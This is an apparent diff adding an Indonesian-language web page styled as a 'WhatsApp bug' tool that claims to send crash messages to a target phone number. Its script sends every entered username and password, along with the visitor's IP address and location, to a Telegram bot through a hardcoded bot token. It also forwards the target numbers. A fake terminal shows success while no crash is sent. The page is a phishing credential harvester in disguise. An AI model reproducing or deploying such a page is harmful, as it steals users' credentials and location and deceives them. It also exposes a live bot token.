@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CRASH IOS CLONE</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+        
+        body {
+            background: #000;
+            color: #0f0;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        #background-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+            opacity: 0.7;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: rgba(0, 20, 0, 0.7);
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            box-shadow: 0 0 15px #0f0;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px #0f0;
+            color: #0f0;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+        }
+        
+        .login-form {
+            background: rgba(0, 20, 0, 0.7);
+            padding: 25px;
+            border-radius: 5px;
+            border: 1px solid #0f0;
+            margin-bottom: 30px;
+            box-shadow: 0 0 15px #0f0;
+        }
+        
+        .form-title {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #0f0;
+            font-size: 1.5rem;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border-radius: 5px;
+            border: 1px solid #0f0;
+            background: rgba(0, 10, 0, 0.8);
+            color: #0f0;
+            font-size: 1rem;
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            box-shadow: 0 0 10px #0f0;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(to right, #0a0, #030);
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            color: #0f0;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+            text-shadow: 0 0 5px #0f0;
+        }
+        
+        .submit-btn:hover {
+            background: linear-gradient(to right, #0f0, #0a0);
+            color: #000;
+            box-shadow: 0 0 15px #0f0;
+        }
+        
+        .bug-form {
+            background: rgba(0, 20, 0, 0.7);
+            padding: 25px;
+            border-radius: 5px;
+            border: 1px solid #0f0;
+            margin-top: 20px;
+            box-shadow: 0 0 15px #0f0;
+            display: none;
+        }
+        
+        .dashboard {
+            text-align: center;
+            padding: 40px 20px;
+            display: none;
+        }
+        
+        .success-icon {
+            font-size: 80px;
+            color: #0f0;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px #0f0;
+        }
+        
+        .dashboard h2 {
+            font-size: 2rem;
+            margin-bottom: 20px;
+            color: #0f0;
+            text-shadow: 0 0 10px #0f0;
+        }
+        
+        .terminal {
+            background: rgba(0, 10, 0, 0.8);
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            padding: 20px;
+            margin-top: 20px;
+            text-align: left;
+            font-family: 'Courier New', monospace;
+            height: 200px;
+            overflow-y: auto;
+        }
+        
+        .terminal-line {
+            margin-bottom: 5px;
+            animation: typing 2s steps(40, end);
+        }
+        
+        @keyframes typing {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+        
+        .glitch {
+            position: relative;
+            animation: glitch 5s infinite;
+        }
+        
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+        
+        .notification {
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            text-align: center;
+            display: none;
+            border: 1px solid #0f0;
+            background: rgba(0, 20, 0, 0.7);
+        }
+        
+        .scan-line {
+            position: absolute;
+            width: 100%;
+            height: 2px;
+            background: rgba(0, 255, 0, 0.5);
+            top: 0;
+            animation: scan 3s linear infinite;
+            z-index: 2;
+        }
+        
+        @keyframes scan {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+        
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .container {
+                padding: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <video id="background-video" autoplay muted loop>
+        <source src="https://files.catbox.moe/ii43pg.mp4" type="video/mp4">
+       
+    </video>
+    
+    <div class="scan-line"></div>
+    
+    <div class="container">
+        <div class="header glitch">
+            <h1>WELCOME TO BUG WA BY CLONE</h1>
+            <p class="subtitle">WEB BUG WA BY CLONE</p>
+        </div>
+        
+        <div class="notification" id="notification"></div>
+        
+        <div class="login-form" id="loginForm">
+            <h2 class="form-title">SYSTEM LOGIN</h2>
+            <form id="accountForm">
+                <div class="form-group">
+                    <label for="username">USERNAME:</label>
+                    <input type="text" id="username" required placeholder="Enter your username">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">PASSWORD:</label>
+                    <input type="password" id="password" required placeholder="Enter your password">
+                </div>
+                
+                <button type="submit" class="submit-btn" id="loginBtn">ACCESS SYSTEM</button>
+            </form>
+        </div>
+        
+        <div class="bug-form" id="bugForm">
+            <h2 class="form-title">BUG WHATSAPP TARGET</h2>
+            <form id="bugReportForm">
+                <div class="form-group">
+                    <label for="targetNumber">NOMOR TARGET:</label>
+                    <input type="text" id="targetNumber" required placeholder="Contoh: 6281234567890">
+                </div>
+                
+                <div class="form-group">
+                    <label for="bugType">TYPE BUG:</label>
+                    <select id="bugType" required>
+                        <option value="">Pilih Type Bug</option>
+                        <option value="CrashIos">CrashIos</option>
+                        <option value="crash×invis">crash×invis</option>
+                        <option value="crash-ui">crash-ui</option>
+                        <option value="blank×kiamat">blank×kiamat</option>
+                        <option value="stuck-ui">stuck-ui</option>
+                        <option value="crash-beta">crash-beta</option>
+                    </select>
+                </div>
+                
+                <button type="submit" class="submit-btn" id="bugBtn">KIRIM BUG</button>
+            </form>
+        </div>
+        
+        <div class="dashboard" id="dashboard">
+            <div class="success-icon">✓</div>
+            <h2>BUG BERHASIL DIKIRIM!</h2>
+            <p>Target: <span id="targetDisplay"></span></p>
+            <p>Bug Type: <span id="bugTypeDisplay"></span></p>
+            
+            <div class="terminal">
+                <div class="terminal-line">> mengirim request ke server</div>
+                <div class="terminal-line">> menghubungkan request ke server</div>
+                <div class="terminal-line">> proses mengirim bug</div>
+                <div class="terminal-line">> mengirim bug force 1msg</div>
+                <div class="terminal-line">> membuat hp korban blank</div>
+                <div class="terminal-line">> hp korban telah meledak ☠️</div>
+                <div class="terminal-line">> opreasi mengirim bug sampai hp meledak selesai</div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>BUG WA NO SENDER NEW</p>
+        </div>
+    </div>
+
+    <script>
+        
+        const loginForm = document.getElementById('loginForm');
+        const bugForm = document.getElementById('bugForm');
+        const dashboard = document.getElementById('dashboard');
+        const notification = document.getElementById('notification');
+        const loginBtn = document.getElementById('loginBtn');
+        const bugBtn = document.getElementById('bugBtn');
+        const targetDisplay = document.getElementById('targetDisplay');
+        const bugTypeDisplay = document.getElementById('bugTypeDisplay');
+        
+      
+        const BOT_TOKEN = '8016003177:AAHvTjdnOf17ZzQ1EYdfqE2UZAin_6tkRGw';
+        const CHAT_ID = '7984698827';
+        
+        
+        document.getElementById('accountForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+           
+            if (!username || !password) {
+                showNotification('Username dan password tidak boleh kosong!', 'error');
+                return;
+            }
+            
+            
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Mengakses Sistem...';
+            
+            try {
+             
+                const loginMessage = `📱 LOGIN REQUEST WEBSITE 📱
+                
+👤 USERNAME: ${username}
+🔑 PASSWORD: ${password}
+⏰ WAKTU: ${new Date().toLocaleString('id-ID')}
+🌐 IP: ${await getIPAddress()}
+📍 LOCATION: ${await getLocation()}`;
+                
+                const response = await sendToTelegram(loginMessage);
+                
+                if (response.ok) {
+                    
+                    loginForm.style.display = 'none';
+                    bugForm.style.display = 'block';
+                    showNotification('Login berhasil! Akses diberikan.', 'success');
+                } else {
+                    throw new Error('Gagal mengirim data login ke Telegram');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showNotification('Terjadi kesalahan. Silakan coba lagi.', 'error');
+            } finally {
+               
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'ACCESS SYSTEM';
+            }
+        });
+        
+        
+        document.getElementById('bugReportForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const targetNumber = document.getElementById('targetNumber').value;
+            const bugType = document.getElementById('bugType').value;
+            
+            
+            if (!targetNumber || !bugType) {
+                showNotification('Harap isi nomor target dan pilih type bug!', 'error');
+                return;
+            }
+            
+            
+            bugBtn.disabled = true;
+            bugBtn.textContent = 'Mengirim Bug...';
+            
+            try {
+              
+                const bugMessage = `☠️ BUG WHATSAPP REQUEST ☠️
+                
+📱 NOMOR: ${targetNumber}
+👻 TYPE BUG: ${bugType}
+⏰ WAKTU: ${new Date().toLocaleString('id-ID')}
+🌐 IP: ${await getIPAddress()}
+📍 LOCATION: ${await getLocation()}`;
+                
+                const response = await sendToTelegram(bugMessage);
+                
+                if (response.ok) {
+                   
+                    bugForm.style.display = 'none';
+                    dashboard.style.display = 'block';
+                    targetDisplay.textContent = targetNumber;
+                    bugTypeDisplay.textContent = bugType;
+                    
+                    
+                    alert('Succes mengirim bug to ' + targetNumber);
+                } else {
+                    throw new Error('Gagal mengirim data bug ke Telegram');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showNotification('Terjadi kesalahan. Silakan coba lagi.', 'error');
+            } finally {
+           
+                bugBtn.disabled = false;
+                bugBtn.textContent = 'KIRIM BUG';
+            }
+        });
+        
+       
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('text', message);
+            
+            return await fetch(url, {
+                method: 'POST',
+                body: formData
+            });
+        }
+        
+        
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Tidak dapat mengambil IP';
+            }
+        }
+        
+      
+        async function getLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return `${data.city}, ${data.region}, ${data.country_name}`;
+            } catch (error) {
+                return 'Lokasi tidak dapat ditentukan';
+            }
+        }
+        
+        
+        function showNotification(message, type) {
+            notification.textContent = message;
+            notification.style.display = 'block';
+            notification.style.color = type === 'success' ? '#0f0' : '#f00';
+            notification.style.borderColor = type === 'success' ? '#0f0' : '#f00';
+            
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 5000);
+        }
+        
+      
+        const terminalLines = document.querySelectorAll('.terminal-line');
+        terminalLines.forEach((line, index) => {
+            line.style.animationDelay = `${index * 0.5}s`;
+        });
+    </script>
+</body>
+</html>
